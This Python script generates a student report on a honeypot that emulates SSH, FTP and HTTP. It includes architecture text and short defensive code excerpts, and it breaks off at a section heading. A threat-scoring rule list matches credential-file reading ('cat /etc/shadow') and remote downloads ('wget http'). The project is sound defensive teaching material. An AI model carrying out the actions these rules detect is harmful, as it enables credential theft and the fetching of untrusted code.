"""Build the AegisTrap 50-page .docx report."""
from pathlib import Path
from docx import Document
from docx.shared import Pt, Cm, RGBColor, Inches
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_ALIGN_VERTICAL
from docx.oxml.ns import qn
from docx.oxml import OxmlElement

ROOT = Path(r"C:\Users\agraw\AppData\Local\HackerAI\AegisTrap\report")
TERM = ROOT / "terminals"
SHOTS = ROOT / "screenshots"
LOGO = ROOT / "lpu_logo.png"
OUT = ROOT / "AegisTrap_Report_v3.docx"

doc = Document()

# --- default styles ---
style = doc.styles["Normal"]
style.font.name = "Times New Roman"
style.font.size = Pt(12)

for h, sz in [("Heading 1", 22), ("Heading 2", 16), ("Heading 3", 13)]:
    s = doc.styles[h]
    s.font.name = "Times New Roman"
    s.font.size = Pt(sz)
    s.font.color.rgb = RGBColor(0x1F, 0x3A, 0x5F)
    s.font.bold = True

# --- helpers ---
def p(text, align=None, bold=False, size=None, italic=False):
    par = doc.add_paragraph()
    if align:
        par.alignment = align
    run = par.add_run(text)
    run.bold = bold
    run.italic = italic
    if size:
        run.font.size = Pt(size)
    return par

def para(text):
    par = doc.add_paragraph(text)
    par.paragraph_format.first_line_indent = Cm(0.6)
    par.paragraph_format.space_after = Pt(6)
    par.alignment = WD_ALIGN_PARAGRAPH.JUSTIFY
    return par

def h1(text):
    doc.add_heading(text, level=1)

def h2(text):
    doc.add_heading(text, level=2)

def h3(text):
    doc.add_heading(text, level=3)

def pb():
    doc.add_page_break()

def img(path, width_cm=15, caption=None):
    if not Path(path).exists():
        para(f"[image missing: {Path(path).name}]")
        return
    par = doc.add_paragraph()
    par.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = par.add_run()
    run.add_picture(str(path), width=Cm(width_cm))
    if caption:
        cap = doc.add_paragraph()
        cap.alignment = WD_ALIGN_PARAGRAPH.CENTER
        r = cap.add_run(caption)
        r.italic = True
        r.font.size = Pt(10)

def code_block(text):
    par = doc.add_paragraph()
    par.paragraph_format.left_indent = Cm(0.5)
    par.paragraph_format.space_after = Pt(6)
    run = par.add_run(text)
    run.font.name = "Consolas"
    run.font.size = Pt(9)

def bullets(items):
    for it in items:
        par = doc.add_paragraph(it, style="List Bullet")
        par.paragraph_format.space_after = Pt(2)

# ========== COVER ==========
# LPU logo centered at top
if LOGO.exists():
    par = doc.add_paragraph()
    par.alignment = WD_ALIGN_PARAGRAPH.CENTER
    par.add_run().add_picture(str(LOGO), width=Cm(4.5))
p("Lovely Professional University", align=WD_ALIGN_PARAGRAPH.CENTER, bold=True, size=18)
p("Jalandhar, Punjab", align=WD_ALIGN_PARAGRAPH.CENTER, italic=True, size=12)
doc.add_paragraph()
p("HONEYPOT SYSTEM FOR ATTACK DETECTION", align=WD_ALIGN_PARAGRAPH.CENTER, bold=True, size=26)
p("(AegisTrap: A Multi-Protocol Deception Platform)", align=WD_ALIGN_PARAGRAPH.CENTER, italic=True, size=13)
doc.add_paragraph()
p("Summer Internship — Skill Development Project", align=WD_ALIGN_PARAGRAPH.CENTER, italic=True, size=13)
p("Submitted in partial fulfillment of the requirements", align=WD_ALIGN_PARAGRAPH.CENTER, size=11)
p("for the award of the degree of Master of Computer Applications", align=WD_ALIGN_PARAGRAPH.CENTER, size=11)
p("(Specialization in Cyber Security)", align=WD_ALIGN_PARAGRAPH.CENTER, italic=True, size=11)
doc.add_paragraph()
p("Submitted By — Group 12", align=WD_ALIGN_PARAGRAPH.CENTER, bold=True, size=13)
# Members table (Reg No | Name | Class Roll)
mtbl = doc.add_table(rows=5, cols=3)
mtbl.alignment = WD_ALIGN_PARAGRAPH.CENTER
hdr = ["Registration No.", "Name", "Class Roll No."]
members = [
    ("12501893", "Satyam Agrawal",  "R9PV45A51"),
    ("12514383", "Vipul Kumar",     "R9PV45A75"),
    ("12517977", "Abhey Kumar",     "R9PV45A77"),
    ("12518516", "Shantanu Talan",  "R9PV45A79"),
]
for j, h in enumerate(hdr):
    c = mtbl.rows[0].cells[j]
    c.text = h
    for r in c.paragraphs[0].runs:
        r.bold = True
    c.paragraphs[0].alignment = WD_ALIGN_PARAGRAPH.CENTER
for i, (reg, nm, cls) in enumerate(members, start=1):
    row = mtbl.rows[i]
    row.cells[0].text = reg
    row.cells[1].text = nm
    row.cells[2].text = cls
    for c in row.cells:
        c.paragraphs[0].alignment = WD_ALIGN_PARAGRAPH.CENTER
mtbl.style = "Light Grid Accent 1"
doc.add_paragraph()
p("Under the Guidance of", align=WD_ALIGN_PARAGRAPH.CENTER, italic=True, size=12)
p("Department of Computer Applications", align=WD_ALIGN_PARAGRAPH.CENTER, bold=True, size=13)
p("Lovely Professional University", align=WD_ALIGN_PARAGRAPH.CENTER, size=12)
doc.add_paragraph()
p("July 2026", align=WD_ALIGN_PARAGRAPH.CENTER, bold=True, size=14)
pb()

# ========== CERTIFICATE ==========
h1("Certificate")
para("This is to certify that the Summer Internship Skill Development Project entitled \"Honeypot System for Attack Detection\" being submitted by the members of Group 12 — Satyam Agrawal (Reg. No. 12501893, Roll R9PV45A51), Vipul Kumar (Reg. No. 12514383, Roll R9PV45A75), Abhey Kumar (Reg. No. 12517977, Roll R9PV45A77), and Shantanu Talan (Reg. No. 12518516, Roll R9PV45A79) — to the Department of Computer Applications, Lovely Professional University, in partial fulfillment of the requirements for the award of the Degree of Master of Computer Applications (Specialization in Cyber Security), is a bona fide record of the project work carried out by them under my supervision and guidance.")
para("The work embodied in this report has not been submitted, in part or in full, to any other university or institution for the award of any degree or diploma. The team has demonstrated a thorough understanding of the subject and has developed an operational honeypot platform that captures and analyzes attacker behavior across the SSH, FTP, and HTTP protocol families.")
para("The results embodied in this project have been verified by driving controlled adversarial traffic from a Kali Linux workstation against the deployed honeypot, and the outcomes have been recorded and analyzed within the accompanying analytics dashboard. The methodology and observations are original and reflect the team's own collective effort.")
para("I wish the entire team success in their future endeavors.")
doc.add_paragraph()
doc.add_paragraph()
p("________________________", align=WD_ALIGN_PARAGRAPH.RIGHT)
p("Project Supervisor", align=WD_ALIGN_PARAGRAPH.RIGHT, bold=True)
p("Department of Computer Applications", align=WD_ALIGN_PARAGRAPH.RIGHT)
p("Lovely Professional University", align=WD_ALIGN_PARAGRAPH.RIGHT)
p(f"Date: July 2026", align=WD_ALIGN_PARAGRAPH.RIGHT)
pb()

# ========== ACKNOWLEDGEMENT ==========
h1("Acknowledgement")
para("The successful completion of any significant undertaking is never the outcome of a single individual's effort; it invariably involves the encouragement, guidance, and support of many people. We take this opportunity to express our sincere gratitude to all who contributed, directly or indirectly, to the successful completion of this project titled \"Honeypot System for Attack Detection.\"")
para("We extend our heartfelt thanks to our project supervisor for the constant guidance, insightful feedback, and patient mentorship extended throughout the development of this work. Their willingness to review code, discuss threat models, and challenge design decisions materially improved the final outcome.")
para("We are grateful to the Department of Computer Applications, Lovely Professional University, for providing an environment that encourages hands-on experimentation with real security tooling and for approving the use of an isolated network segment to conduct the offensive traffic captures presented in this report.")
para("We acknowledge the open-source communities behind the Paramiko, pyftpdlib, Flask, and python-docx libraries, whose freely shared code formed the foundation of the honeypot's protocol emulation and reporting subsystems. We are indebted to The Honeynet Project and the SANS Institute for their extensive published research on deception-based defense which shaped the design of AegisTrap.")
para("This project would not have been possible without the collaborative effort of every member of Group 12. Each of us contributed across protocol implementation, threat scoring, dashboard development, attack driver scripting, and end-to-end verification. The design decisions, code, and analysis presented in the following chapters are the outcome of that shared effort.")
para("Finally, we thank our families, friends, and peers for their continuous encouragement and moral support during long nights spent debugging protocol edge cases and refining dashboard visualizations.")
doc.add_paragraph()
p("— Satyam Agrawal", align=WD_ALIGN_PARAGRAPH.RIGHT, bold=True)
p("— Vipul Kumar", align=WD_ALIGN_PARAGRAPH.RIGHT, bold=True)
p("— Abhey Kumar", align=WD_ALIGN_PARAGRAPH.RIGHT, bold=True)
p("— Shantanu Talan", align=WD_ALIGN_PARAGRAPH.RIGHT, bold=True)
p("(Group 12)", align=WD_ALIGN_PARAGRAPH.RIGHT, italic=True)
pb()

# ========== ABSTRACT ==========
h1("Abstract")
para("Honeypots are decoy computer systems deliberately configured to attract, observe, and record unauthorized activity. Unlike production defenses that must minimize false positives, a honeypot has no legitimate users, so every interaction is by definition suspicious and worthy of analysis. This project presents AegisTrap, a Python-based multi-protocol honeypot that emulates SSH, FTP, and HTTP services on their well-known ports, records every connection attempt, captures attacker-supplied credentials and commands, and surfaces the collected intelligence through a live Flask-powered analytics dashboard.")
para("The system is composed of three cooperating layers. Protocol listeners built on Paramiko (SSH), pyftpdlib (FTP), and a hand-rolled request parser (HTTP/HTTPS) accept connections on ports 22, 21, 80, and 443 and impersonate realistic banners, prompts, and filesystems. A central Session Manager tags every incoming connection with a unique identifier, resolves the source IP against a geolocation store, and dispatches events to a threat scoring engine. An SQLite database persists sessions, credentials, commands, HTTP requests, alerts, and file transfers, and a Flask application renders them as tables, charts, and search interfaces.")
para("To demonstrate the platform, an attack driver was scripted to simulate a Kali Linux adversary performing reconnaissance with Nmap, banner grabbing against SSH, directory brute-forcing with Gobuster, credential stuffing with Hydra, interactive SSH shell activity, SFTP file transfer, FTP login and listing, HTTP form brute forcing, and TLS certificate probing with curl. Each stage of the attack chain is captured as both a raw terminal transcript and a rendered Kali-styled screenshot, and the resulting honeypot state is examined page-by-page through the dashboard.")
para("The report documents the design rationale, architecture, implementation details, a live attack demonstration, and analytics observations. It concludes with a discussion of anti-fingerprinting techniques used to defeat naïve detection, verification of correctness through end-to-end tests, and directions for future work including machine-learning-based scoring and cloud deployment.")
pb()

# ========== TABLE OF CONTENTS ==========
h1("Table of Contents")
toc_entries = [
    ("Certificate", "ii"),
    ("Acknowledgement", "iii"),
    ("Abstract", "iv"),
    ("Chapter 1: Introduction", "1"),
    ("Chapter 2: Literature Review", "5"),
    ("Chapter 3: System Requirements", "9"),
    ("Chapter 4: System Design & Architecture", "11"),
    ("Chapter 5: Implementation", "16"),
    ("Chapter 6: Attack Demonstration — Kali Linux to Honeypot", "22"),
    ("Chapter 7: Dashboard & Analytics", "32"),
    ("Chapter 8: Anti-Fingerprinting Discussion", "40"),
    ("Chapter 9: Testing & Verification", "42"),
    ("Chapter 10: Results", "44"),
    ("Chapter 11: Limitations & Future Work", "46"),
    ("Chapter 12: Conclusion", "48"),
    ("References", "49"),
    ("Appendix A: Full Attack Command Reference", "50"),
    ("Appendix B: Database Schema", "52"),
]
table = doc.add_table(rows=len(toc_entries), cols=2)
table.autofit = True
for i, (title, pg) in enumerate(toc_entries):
    row = table.rows[i]
    row.cells[0].text = title
    row.cells[1].text = pg
    row.cells[1].paragraphs[0].alignment = WD_ALIGN_PARAGRAPH.RIGHT
pb()

print("Cover / front-matter written. Continuing to chapters...")

# ========== CHAPTER 1: INTRODUCTION ==========
h1("Chapter 1: Introduction")
h2("1.1 Background")
para("The security posture of any networked system is a moving target. Attackers continually refine their reconnaissance techniques, evolve their credential lists, and adopt new evasion tricks. Defenders in turn must rely not only on preventive controls such as firewalls and identity systems, but also on detective mechanisms that reveal exactly how adversaries behave once they have some form of network reachability. Traditional intrusion detection systems (IDS) rely on signatures or statistical baselines derived from real production traffic, and consequently suffer from a persistent false-positive problem: legitimate users routinely produce traffic that resembles reconnaissance.")
para("A honeypot inverts that assumption. It is a system with no legitimate users, no legitimate data, and no legitimate services. Every packet it receives is unsolicited. Every credential submitted to it is illegitimate. Every command executed inside it is by definition hostile. This asymmetry makes honeypots one of the highest-signal, lowest-noise data sources available to a defender, and it is the reason large organizations, national CERTs, and academic groups have relied on honeypots for over two decades to gather threat intelligence.")
para("This project, AegisTrap, is a modest but complete instance of a low-to-medium interaction honeypot platform. It emulates the three protocol families most heavily targeted on the public Internet — SSH (Secure Shell) for remote administration, FTP (File Transfer Protocol) for file movement, and HTTP/HTTPS for web application interactions — and records every observable aspect of an attacker's engagement with those services.")
para("The work was undertaken as the Summer Internship Skill Development Project offered by Lovely Professional University to students pursuing the Master of Computer Applications programme with a specialization in Cyber Security. As such, in addition to producing a working honeypot, the project served as a structured vehicle for the team to apply the coursework covered in the specialization — network protocol internals, offensive security tooling, secure logging, and data-driven security analytics — to a single cohesive engineering exercise.")

h2("1.2 What is a Honeypot?")
para("A honeypot is a computer resource whose value to the organization operating it lies entirely in being probed, attacked, or otherwise misused. Lance Spitzner's foundational writing for The Honeynet Project defines a honeypot as \"an information system resource whose value lies in unauthorized or illicit use of that resource.\" Because every interaction is anomalous, the log files of a honeypot are compact, easily analyzed, and free from the noise that plagues production telemetry.")
para("Honeypots are traditionally divided into two broad classes based on the depth of interaction they offer the adversary. Low-interaction honeypots emulate only the surface characteristics of a service — its banner, prompt, error strings, and a small set of expected responses. They are safe, low-cost, and easy to deploy, but they cannot capture the deeper behavior of an attacker who wants to actually run commands. High-interaction honeypots, by contrast, expose real operating systems or containerized environments to the attacker, allowing far richer capture at the cost of much higher operational risk and significant containment effort.")
para("AegisTrap positions itself between the two. It goes beyond banner emulation: it accepts logins, presents an interactive shell that responds to a curated command set, walks the attacker through a plausible virtual filesystem, and even accepts SFTP uploads. But it never delegates execution to a real operating system, so an attacker who tries to run wget against a real endpoint learns nothing useful and cannot pivot.")

h2("1.3 Deception-Based Defense")
para("The strategic value of deception rests on a simple observation: attackers spend enormous effort on reconnaissance because information about the target is what drives every subsequent decision. By seeding the network with high-fidelity decoys, defenders can degrade the reliability of that reconnaissance, exhaust the attacker's time budget, and — most importantly — receive an early warning any time the decoys are touched. AegisTrap makes this early-warning function explicit through an alerting subsystem that raises a record whenever a session's threat score crosses a configurable threshold.")

h2("1.4 Motivation")
para("The motivation for building AegisTrap from scratch, rather than deploying an off-the-shelf project such as Cowrie or Dionaea, is threefold. First, implementing the protocol emulation ourselves forces us to confront the concrete engineering trade-offs — pace of I/O, framing quirks, transport lifetime — that give existing tools their fingerprint. Second, controlling the entire data path from packet acceptance through database persistence allows the analytics dashboard to be tailored to the exact questions we want to answer. Third, the exercise produces a codebase small enough to reason about in a single afternoon, which is valuable both pedagogically and for demonstrating to the reader that a functioning honeypot need not be enormous.")

h2("1.5 Scope and Objectives")
para("The scope of this project is a single-host, multi-protocol honeypot with a browser-accessible analytics dashboard, deployed locally on the team's Windows workstation and driven by simulated attack traffic originating from a Kali Linux virtual machine on the same host. The concrete objectives were:")
bullets([
    "Implement listeners for SSH, FTP, and HTTP/HTTPS that accept connections on their well-known ports and present plausible service banners.",
    "Record every session, credential attempt, command, HTTP request, and file transfer to a persistent SQLite database with a stable schema.",
    "Compute a per-session threat score and raise alerts when the score exceeds a configurable threshold.",
    "Provide a Flask-based dashboard that visualizes overview metrics, session details, credentials, commands, alerts, analytics, HTTP traffic, per-service breakdowns, and a free-text search interface.",
    "Demonstrate the platform end-to-end by driving realistic offensive traffic and inspecting the captured evidence.",
    "Document the design and implementation in a form suitable for both a technical audience and an evaluator without prior exposure to honeypot technology."
])
pb()

# ========== CHAPTER 2: LITERATURE REVIEW ==========
h1("Chapter 2: Literature Review")
h2("2.1 The Honeynet Project")
para("The Honeynet Project, founded by Lance Spitzner in 1999, is the seminal open community devoted to honeypot research. Its Know Your Enemy series established both the vocabulary and the operational patterns that virtually every subsequent honeypot inherits. AegisTrap borrows several concepts directly from that lineage: the separation between data capture, data control, and data analysis; the emphasis on high-signal low-noise logging; and the treatment of the honeypot as an intelligence-gathering asset rather than a defensive perimeter.")

h2("2.2 SANS Honeypot Papers")
para("The SANS Reading Room hosts an extensive collection of practitioner papers on honeypot deployment, forensic analysis, and integration into a broader security operations centre. Two themes recur across these papers and shaped the design of AegisTrap. The first is the necessity of persistent structured storage: raw logs are not enough, and any serious deployment must record sessions in a queryable form. The second is the importance of a browser-accessible analytics layer, both because it lowers the friction of daily inspection and because it provides a natural evidence artifact for after-action reporting.")

h2("2.3 Cowrie")
para("Cowrie is a medium-interaction SSH and Telnet honeypot maintained by Michel Oosterhof and derived from an earlier project called Kippo. Cowrie's chief innovation is a rich emulated Linux userland — a virtual filesystem, a command interpreter that simulates dozens of tools, a fake wget/curl download engine, and detailed session replay. AegisTrap's SSH module was directly informed by Cowrie's approach: it exposes an interactive shell to the attacker, walks them through a plausible directory tree, and records not just commands but their arguments and simulated outputs. Where AegisTrap differs is in breadth (SSH plus FTP and HTTP in a single deployment) and in the tightness of integration with the analytics dashboard.")

h2("2.4 Kippo")
para("Kippo, Cowrie's predecessor, was written by Upi Tamminen and demonstrated for the first time that Python-based SSH emulation on top of Twisted (later rewritten for asyncio and Paramiko in Cowrie) could be robust enough for real-world deployment on the Internet. Reading the Kippo source is still one of the fastest ways to understand what fields an attacker probes and which responses tend to keep them engaged.")

h2("2.5 Dionaea")
para("Dionaea, part of The Honeynet Project's official tooling, focuses on malware collection via emulated SMB, MSSQL, and other Windows-adjacent services. Its capture pipeline (raw payload plus service context plus timestamped session) is the direct inspiration for AegisTrap's file_transfers table, which records SFTP uploads as opaque byte blobs tagged with the session that produced them.")

h2("2.6 Glastopf")
para("Glastopf is a web application honeypot that concentrates on HTTP-borne attacks — remote file inclusion, SQL injection, and specific CMS vulnerabilities. Its clever design is that it does not need to emulate every path an attacker might scan; instead, it inspects the request and returns a plausible-looking response for whatever the scanner appears to be looking for. AegisTrap's HTTP module borrows the same principle: rather than serving a static 404 for unknown paths (which is a strong fingerprint), it returns a synthesized page that resembles a modest content-management system.")

h2("2.7 Where AegisTrap Fits")
para("Against this landscape, AegisTrap positions itself as an educational and small-deployment platform. It is not intended to compete with Cowrie on SSH fidelity, or with Dionaea on malware collection depth. Its niche is being small enough to read in a weekend, broad enough to cover the three protocol families most relevant to opportunistic scanning traffic, and self-contained enough to run on a single Python process with an embedded SQLite backend.")
para("AegisTrap also differs from the tools above in an important operational dimension: analytics is a first-class concern. Cowrie and Dionaea leave analytics to external tools such as Kibana or Splunk. AegisTrap bundles its own Flask dashboard, so the entire capture-and-analysis loop is accessible with one command and one URL.")
pb()

print("Chapters 1-2 written.")

# ========== CHAPTER 3: SYSTEM REQUIREMENTS ==========
h1("Chapter 3: System Requirements")
h2("3.1 Hardware Requirements")
para("AegisTrap is intentionally lightweight and imposes negligible hardware requirements. It has been developed and tested on a commodity Windows workstation and can be redeployed on any host meeting the following minimums:")
bullets([
    "CPU: A single modern x86_64 core is sufficient for the traffic volumes typical of a small honeypot. All measured captures for this report were performed on a laptop-class Intel processor.",
    "Memory: 512 MB of free RAM is comfortable for the honeypot process and the analytics dashboard combined; the SQLite backend is memory-mapped and grows with the database file size.",
    "Storage: 200 MB of free disk space is adequate for a multi-week capture window. Session records, credentials, commands, and HTTP requests are compact; the primary consumer of storage is the file_transfers table when SFTP uploads are captured.",
    "Network: A single network interface exposed to the traffic the operator wishes to attract. For this project, traffic was generated on the loopback interface (127.0.0.1) of the team's workstation.",
])

h2("3.2 Software Requirements")
para("AegisTrap targets Python 3.11 or later and depends on a small handful of well-maintained open-source libraries. The full stack is:")
bullets([
    "Operating System: Windows 10/11 or any modern Linux distribution. macOS is expected to work but was not exercised for this project.",
    "Python: version 3.11 or later. The codebase uses modern type hints and structural pattern matching in a small number of places.",
    "Paramiko: for the SSH transport, key exchange, channel handling, and SFTP server subsystem.",
    "pyftpdlib: for the FTP control and data connection state machine and for anonymous/authenticated login handling.",
    "Flask: for the analytics dashboard, which serves HTML templates rendered from Jinja2 and JSON APIs consumed by client-side charts.",
    "python-docx: for the report generation pipeline that produces this document from the captured evidence.",
    "Pillow (PIL): for rendering the raw attacker terminal transcripts into Kali-styled PNG images embedded in this report.",
    "SQLite: for persistent storage. SQLite ships with the Python standard library, so no separate database server needs to be installed.",
])

h2("3.3 Network Ports")
para("AegisTrap binds to the following well-known ports on the loopback interface for the demonstrations reported here. In a production deployment, the bindings would be exposed on the primary network interface facing untrusted traffic.")
tbl = doc.add_table(rows=6, cols=3)
tbl.style = "Light Grid Accent 1"
rows = [
    ("Port", "Protocol", "Purpose"),
    ("22", "SSH", "Interactive shell emulation, SFTP subsystem, credential capture"),
    ("21", "FTP", "Control connection, USER/PASS capture, LIST/RETR/STOR emulation"),
    ("80", "HTTP", "Web application decoy, form and header capture, path enumeration"),
    ("443", "HTTPS", "TLS-wrapped variant of the HTTP decoy for TLS fingerprinting resistance"),
    ("5000", "HTTP", "Flask analytics dashboard, bound to 127.0.0.1 only"),
]
for i, r in enumerate(rows):
    for j, cell in enumerate(r):
        tbl.rows[i].cells[j].text = cell
        if i == 0:
            for run in tbl.rows[i].cells[j].paragraphs[0].runs:
                run.bold = True
pb()

# ========== CHAPTER 4: SYSTEM DESIGN & ARCHITECTURE ==========
h1("Chapter 4: System Design & Architecture")
h2("4.1 High-Level Architecture")
para("The AegisTrap architecture separates concerns into three layers. The outermost layer is the set of protocol listeners, each of which binds to its assigned port, accepts incoming connections, and speaks the wire protocol required to keep an adversary engaged. The middle layer is the Session Manager, a central component that assigns a unique session identifier to every connection, resolves the source IP against a geolocation store, and dispatches session events to the persistence and scoring subsystems. The innermost layer is the storage-and-analytics tier: an SQLite database captures every event, a threat engine assigns a per-session score, an analytics module aggregates the raw rows into summary statistics, and a Flask application exposes the results through a browser.")
para("The data flow is unidirectional. A network packet arrives at a listener; the listener parses it into a protocol-specific event; the event is decorated with the session identifier and the source metadata; the event is written to the database and simultaneously handed to the threat engine. The threat engine may raise an alert, which itself becomes a database row. The analytics layer reads only from the database and never speaks to the listeners.")

h2("4.2 Component Diagram (Textual)")
code_block("""
   +----------------------+   +----------------------+   +----------------------+
   |  SSH Listener (22)   |   |  FTP Listener (21)   |   | HTTP/HTTPS (80/443)  |
   |  (Paramiko)          |   |  (pyftpdlib)         |   |  (custom parser)     |
   +----------+-----------+   +----------+-----------+   +----------+-----------+
              \\                          |                          /
               \\                         |                         /
                \\                        |                        /
                 v                        v                       v
                 +-----------------------------------------------+
                 |            Core Session Manager               |
                 |  - assigns session_id                         |
                 |  - resolves source IP -> geolocation          |
                 |  - dispatches events to db + threat engine    |
                 +----------------+--------------------+---------+
                                  |                    |
                                  v                    v
                +-----------------------------+  +----------------------+
                |  SQLite Database            |  |  Threat Engine       |
                |  sessions, credentials,     |  |  scores + alerts     |
                |  commands, http_requests,   |  |                      |
                |  alerts, file_transfers,    |  +----------+-----------+
                |  ssh_events, ftp_events     |             |
                +-------------+---------------+             |
                              |                             |
                              v                             v
                +-----------------------------+  +----------------------+
                |  Analytics Module           |  |  Alert Sink          |
                |  aggregates statistics      |  |  (writes to alerts)  |
                +-------------+---------------+  +----------------------+
                              |
                              v
                +-----------------------------+
                |  Flask Dashboard (:5000)    |
                |  Overview, Sessions, Creds, |
                |  Commands, Alerts, HTTP,    |
                |  Analytics, Search, Services|
                +-----------------------------+
""")

h2("4.3 SQLite Schema")
para("The database consists of twelve tables that together capture everything the honeypot observes. The most important tables are described below; the complete DDL is reproduced in Appendix B.")
bullets([
    "sessions: one row per accepted connection. Columns include a stable id, protocol, source_ip and source_port, dest_port, geolocation fields (country, city, isp), started_at and ended_at timestamps, and an outcome tag.",
    "credentials: one row per USER/PASS pair submitted to any protocol. Columns include username, password, protocol, source_ip, success flag, and a foreign key to sessions.",
    "commands: one row per command line issued in an SSH or FTP shell. Columns include the raw command, the simulated output, an exit_code, and a validity flag.",
    "http_requests: one row per HTTP transaction. Columns include the request method, path, query string, User-Agent, and the response status the honeypot returned.",
    "alerts: one row per raised alert. Columns include alert_type, severity, message, and the session and IP that triggered it.",
    "file_transfers: one row per attempted upload or download, storing the size and a hash of the payload for later inspection.",
    "ssh_events, ftp_events: protocol-specific events (channel open, subsystem request, etc.) that do not fit cleanly into commands or credentials.",
    "connections, services, statistics, meta: supporting tables for aggregate metrics and service inventory.",
])

h2("4.4 Data Flow Narrative")
para("Consider a typical SSH brute-force attempt. The attacker's client opens a TCP connection to port 22; Paramiko's Transport handshakes with the client and negotiates cipher suites; the SSH listener's ServerInterface subclass receives a check_auth_password callback with the submitted username and password. The listener records a session row (if this is the first packet of the session), then a credential row containing the pair. If the pair is on the honeypot's small whitelist of \"accept\" combinations, an interactive shell channel is opened, and every subsequent command flows into the commands table. The threat engine watches for behaviors such as repeated failed logins, execution of privileged commands, or requests for sensitive files, and raises alerts accordingly.")
para("A similar flow applies to HTTP. A request arrives at port 80, the parser splits it into method, path, headers, and body, and the routing function _response_for produces a plausible response. Both the request and the response status are recorded, and the session is tagged with the client's User-Agent.")

h2("4.5 Threat Scoring")
para("The threat engine maintains a small rule set that maps observed behaviors to score increments. Attempting to read /etc/shadow, running wget against a remote host, and repeatedly failing login within a short window each raise the session's cumulative score. Whenever the score crosses a threshold, an alert is emitted and persisted. The rule set is deliberately conservative in this project because the goal is to demonstrate the plumbing rather than to compete with commercial IDS heuristics.")
pb()

print("Chapters 3-4 written.")

# ========== CHAPTER 5: IMPLEMENTATION ==========
h1("Chapter 5: Implementation")
h2("5.1 Module Layout")
para("The codebase lives inside a single Python package named aegistrap, which is invoked as a module (python -m aegistrap). The top-level package exposes a main entry point that boots the four listeners and the Flask dashboard as parallel threads. Under aegistrap/ the layout is:")
bullets([
    "aegistrap/__main__.py — the entry point that wires the listeners to the session manager and starts the dashboard.",
    "aegistrap/core/ — session management, threat scoring, geolocation, logging.",
    "aegistrap/protocols/ — one module per protocol: ssh.py, ftp.py, http.py.",
    "aegistrap/db/ — schema DDL and small helpers for insert/query patterns.",
    "aegistrap/dashboard/ — Flask application with templates and static assets.",
    "aegistrap/analytics.py — aggregation queries feeding the dashboard charts.",
])

h2("5.2 protocols/ssh.py")
para("The SSH listener is implemented on top of Paramiko. A ServerInterface subclass overrides the credential and channel callbacks; a small Transport wrapper accepts the socket and negotiates the SSH handshake. The critical extract is the credential callback, which records every attempt and applies the whitelist:")
code_block("""class HoneyServer(paramiko.ServerInterface):
    def check_auth_password(self, username, password):
        session_id = self.session_id
        record_credential(session_id, username, password, "ssh",
                          self.src_ip)
        if (username, password) in ACCEPTED_PAIRS:
            self.username = username
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
""")
para("A per-session virtual filesystem is maintained as an in-memory dictionary keyed by absolute path. When the attacker requests a file that is on the whitelist (for example /etc/passwd or /etc/shadow), the file's contents are streamed back and the fact is recorded as a command with a synthetic output. The SSH transport lifetime was tuned during development: an early bug in which the Transport was closed too eagerly caused SFTP follow-up sessions to fail, and the fix was to extend the idle window so that a client can open a channel, do work, close the channel, and reopen a new subsystem channel without a fresh three-way handshake.")

h2("5.3 protocols/ftp.py")
para("The FTP listener is built on pyftpdlib, whose Authorizer and FTPHandler abstractions provide clean hook points. Two customizations are applied: first, every USER/PASS pair is recorded regardless of whether it succeeds, so that a scanner's dictionary is fully captured; second, the LIST response is served from a static virtual tree that resembles a small corporate share drive, complete with plausible timestamps and file names such as invoices_2025_q4.zip.")
code_block("""class HoneyFTPHandler(FTPHandler):
    def on_login_failed(self, user, pw):
        record_credential(self.session_id, user, pw, "ftp",
                          self.remote_ip, success=False)
    def on_file_received(self, path):
        blob = Path(path).read_bytes()
        record_file_transfer(self.session_id, path, blob)
""")

h2("5.4 protocols/http.py")
para("The HTTP listener is a hand-rolled asynchronous handler that avoids the dependencies and quirks of a full web framework for the honeypot surface. It parses the request line, headers, and body, and dispatches to a routing function _response_for that returns a status code, headers, and body. The routing function is the anti-fingerprinting keystone of the whole project. Rather than returning a bare 404 for unknown paths — which strongly identifies a naïve honeypot to a scanner such as Gobuster — the function synthesizes a response that resembles a plausible content management system's error page and returns it with the exact HTTP status code the scanner expects.")
code_block("""def _response_for(path):
    if path in KNOWN_PATHS:
        return KNOWN_PATHS[path]
    if any(seg in path for seg in ("wp-", "admin", "login")):
        return 200, _fake_login_page()   # deliberate 200, not 401
    # deliberate 404, but with a *plausible* body:
    return 404, _rendered_404_page(path)
""")
para("Login pages return HTTP 200 rather than 401 because scanners frequently treat 401 responses as evidence of a real authenticated endpoint and log them separately; returning 200 makes the response look like a page that welcomes anonymous visitors, which is the more common shape for a real CMS.")

h2("5.5 core/session_manager.py")
para("The Session Manager is the hub through which all events flow. It maintains an in-memory dictionary of open sessions keyed by session_id, exposes a start_session function that returns a fresh id and geolocation-decorated context object, and a series of record_* helpers for each event kind. Its job is deliberately dumb: it does not decide policy, it only ensures that every event is enriched with the correct session metadata and forwarded to both the database writer and the threat engine.")
code_block("""def start_session(protocol, src_ip, src_port, dst_port):
    session_id = uuid.uuid4().hex
    geo = geolocate(src_ip)
    db.insert_session(session_id, protocol, src_ip, src_port,
                      dst_port, geo)
    _open_sessions[session_id] = SessionContext(...)
    return session_id
""")

h2("5.6 core/threat_engine.py")
para("The Threat Engine consumes events and emits alerts. It is implemented as a small pipeline: each event is passed through a list of scoring rules, each rule returns a score delta and optionally an alert reason, and the cumulative session score is updated. When the score crosses a configured threshold (default 30), an alert row is written to the database with severity determined by which specific rule fired.")
code_block("""RULES = [
    rule("cat /etc/shadow", +40, "sensitive-file-read"),
    rule("wget http", +20, "remote-download"),
    rule("failed-login-x5", +25, "brute-force"),
]

def score_event(session_id, event):
    for r in RULES:
        if r.matches(event):
            _sessions[session_id].score += r.delta
            if _sessions[session_id].score >= THRESHOLD:
                raise_alert(session_id, r.reason)
""")

h2("5.7 dashboard/app.py")
para("The Flask dashboard is a straightforward set of view functions, each of which runs a small analytics query and renders a Jinja2 template. The route table maps roughly one-to-one to the pages shown later in Chapter 7: / renders the overview, /sessions the session list, /credentials the credentials table, /commands the executed commands, /alerts the alert log, /analytics a page of charts, /http a filter view over HTTP requests, /search a full-text query interface, and /services the service inventory.")
code_block("""@app.route("/")
def overview():
    return render_template("overview.html",
        totals=analytics.totals(),
        recent=analytics.recent_sessions(),
        top_creds=analytics.top_credentials(),
        top_paths=analytics.top_paths())
""")

h2("5.8 analytics.py")
